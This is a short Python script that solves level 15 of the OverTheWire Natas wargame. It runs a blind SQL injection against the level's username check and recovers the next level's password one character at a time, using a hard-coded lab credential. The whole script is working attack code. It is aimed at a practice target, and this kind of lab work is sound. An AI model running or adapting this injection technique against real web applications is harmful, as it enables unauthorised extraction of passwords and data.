# AUTHOR: Federico de Faveri
# DATE:    Jun 2017
# PURPOSE: to bruteforce level 15 of natas wargame
# WEB ADDRESS: http://natas15.natas.labs.overthewire.org/
# SPECIAL THANKS: to mr. Godinho for the inspiration and base code.

# Library to work with POST requests
import requests

web_user = "natas15"
web_passwd = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

# All possible characters
all_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# Parsed characters, the ones that actually exist in the password
parsed_chars = ''
# Final Password
password = ''
# target URL with credential
target = 'http://%s:%s@natas15.natas.labs.overthewire.org/' % (web_user, web_passwd)

# The string that tells we're on the right path
existsStr = 'This user exists.'

# Checking if we can connect to the target, just in case...
r = requests.get(target)

if r.status_code != requests.codes.ok:
        raise ValueError('ERROR - Couldn\'t connect to target')
else:
        print 'Target reachable. Starting character parsing...'

# here we see what characters are actually part of the pwd
for c in all_chars:
        # SQL injection #1
        r = requests.get(target+'?username=natas16" AND password LIKE BINARY "%'+c+'%" "')
        # So does the password use this char?
        if r.content.find(existsStr) != -1:
                parsed_chars += c
                print 'Used chars: ' + parsed_chars

print 'Characters parsed. Starting brute force...'

# Assuming password is 32 characters long
for i in range(32):
        for c in parsed_chars:
                # SQL injection #2
                r = requests.get(target+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
                # Did we found the character at the i position of the password?
                if r.content.find(existsStr) != -1:
                        password += c
                        print 'Password: ' + password + '*' * int(32 - len(password))
                        break

print 'Done!!!'